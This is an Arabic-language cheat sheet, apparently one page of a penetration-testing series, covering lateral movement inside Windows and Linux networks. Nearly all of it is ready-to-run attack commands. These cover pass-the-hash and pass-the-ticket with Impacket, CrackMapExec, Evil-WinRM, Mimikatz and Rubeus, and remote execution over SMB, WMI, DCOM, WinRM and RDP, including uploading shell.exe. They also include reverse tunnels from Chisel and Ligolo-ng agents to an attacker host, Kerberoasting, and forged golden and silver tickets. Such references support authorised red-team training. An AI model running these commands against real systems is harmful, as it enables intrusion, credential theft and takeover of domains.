<a id="-phase-4-lateral-movement"></a>
# ➡️ المرحلة 4: الحركة الجانبية (Lateral Movement)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](04-Lateral-Movement.tr.md) • [🇬🇷 Ελληνικά](04-Lateral-Movement.el.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**الهدف:** الانتقال من النظام المخترق إلى أنظمة أخرى داخل الشبكة.

---

<a id="-credential-based-movement"></a>
## 🔑 الحركة اعتماداً على بيانات الاعتماد

<a id="pass-the-hash-pth"></a>
### تمرير البصمة (Pass-the-Hash / PTH)
```bash
# استخدام PSExec من Impacket مع بصمة
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

<a id="pass-the-ticket-ptt"></a>
### تمرير التذكرة (Pass-the-Ticket / PTT)
```powershell
# تصدير تذكرة من الذاكرة باستخدام Mimikatz
sekurlsa::tickets /export

# استيراد التذكرة
kerberos::ptt ticket.kirbi

# أو باستخدام Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# التحقق من التذكرة
klist
```

<a id="overpass-the-hash-pass-the-key"></a>
### الحصول على تذكرة باستخدام البصمة أو المفتاح (Overpass-the-Hash / Pass-the-Key)
```powershell
# Mimikatz — طلب TGT ببصمة NTLM
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

<a id="pass-the-certificate"></a>
### تمرير الشهادة (Pass-the-Certificate)
```bash
# استخدام شهادة للمصادقة
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# باستخدام Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

<a id="-remote-execution-methods"></a>
## 🖥️ طرق التنفيذ عن بُعد

<a id="psexec"></a>
### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

<a id="wmiexec"></a>
### WMIExec
```bash
# WMIExec من Impacket (أقل ظهوراً وفق وصف الأصل)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

<a id="winrm--evil-winrm"></a>
### WinRM / Evil-WinRM
```bash
# استخدام Evil-WinRM مع كلمة مرور
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# استخدام Evil-WinRM مع بصمة
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# الاتصال عن بُعد عبر PowerShell
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

<a id="dcom"></a>
### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

<a id="smb"></a>
### SMB
```bash
# تنفيذ أوامر باستخدام CrackMapExec
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# نسخ ملفات عبر SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# بأسلوب PsExec
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

<a id="rdp"></a>
### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# باستخدام بصمة NTLM ووضع المسؤول المقيّد
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# تفعيل RDP عن بُعد
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

<a id="ssh-linux"></a>
### SSH (Linux)
```bash
# اتصال SSH بكلمة مرور
ssh user@192.168.1.10

# اتصال SSH بمفتاح
ssh -i id_rsa user@192.168.1.10

# أنفاق SSH والعبور الشبكي
ssh -D 9050 user@192.168.1.10  # وكيل SOCKS
ssh -L 8080:internal:80 user@192.168.1.10  # إعادة توجيه منفذ محلي
```

---

<a id="-network-pivoting"></a>
## 🔄 العبور إلى شبكات أخرى (Pivoting)

<a id="ssh-tunneling"></a>
### إنشاء أنفاق SSH
```bash
# إعادة توجيه منفذ محلي: الوصول إلى internal:80 عبر localhost:8080
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# وكيل SOCKS ديناميكي
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# إعادة توجيه منفذ بعيد
ssh -R 4444:localhost:4444 user@192.168.1.10
```

<a id="chisel"></a>
### Chisel
```bash
# على جهاز المهاجم (الخادم)
./chisel server --reverse --port 8080

# على الجهاز المستهدف (العميل)
./chisel client ATTACKER_IP:8080 R:socks

# الاستخدام مع proxychains
proxychains nmap 192.168.2.10
```

<a id="ligolo-ng"></a>
### Ligolo-ng
```bash
# على جهاز المهاجم
./proxy -selfcert

# على الجهاز المستهدف
./agent -connect ATTACKER_IP:11601 -ignore-cert

# داخل واجهة الوكيل
session
start
```

<a id="metasploit-pivoting"></a>
### العبور الشبكي باستخدام Metasploit
```bash
# إضافة مسار عبر جلسة meterpreter
run autoroute -s 192.168.2.0/24

# أو يدوياً
route add 192.168.2.0 255.255.255.0 1

# وكيل SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

<a id="-kerberos-attacks"></a>
## 🎫 هجمات Kerberos

<a id="kerberoasting"></a>
### استخراج تذاكر الخدمات لكسرها خارجياً (Kerberoasting)
```bash
# الحصول على تذاكر الخدمات
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# كسر البصمات باستخدام hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

<a id="as-rep-roasting"></a>
### استخراج ردود AS-REP لكسرها خارجياً (AS-REP Roasting)
```bash
# البحث عن مستخدمين دون مصادقة مسبقة
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# كسر البصمات
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

<a id="golden-ticket"></a>
### التذكرة الذهبية (Golden Ticket)
```powershell
# الحصول على بصمة krbtgt أولاً، ثم:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

<a id="silver-ticket"></a>
### التذكرة الفضية (Silver Ticket)
```powershell
# إنشاء تذكرة لخدمة محددة
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="lateral-movement-techniques"></a>
### تقنيات الحركة الجانبية

| التقنية | المنفذ | الأداة |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

<a id="required-credentials"></a>
### بيانات الاعتماد المطلوبة

| الطريقة | المتطلب |
|--------|-------------|
| Pass-the-Hash | بصمة NTLM |
| Pass-the-Ticket | تذكرة Kerberos |
| PSExec | صلاحيات مسؤول مع الوصول إلى SMB |
| WinRM | تفعيل WinRM مع صلاحيات مسؤول |
| RDP | تفعيل RDP والعضوية في مجموعة RDP |

---

<a id="-related-cheatsheets"></a>
## 🔗 أدلة مرجعية ذات صلة

- [Impacket](../../Impacket/README.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/README.md)
- [Rubeus](../../Rubeus/README.md)

---

**المرحلة السابقة:** [← 03 - تصعيد الصلاحيات](./03-Privilege-Escalation.ar.md)

**المرحلة التالية:** [05 - ترسيخ الوصول →](./05-Persistence.ar.md)
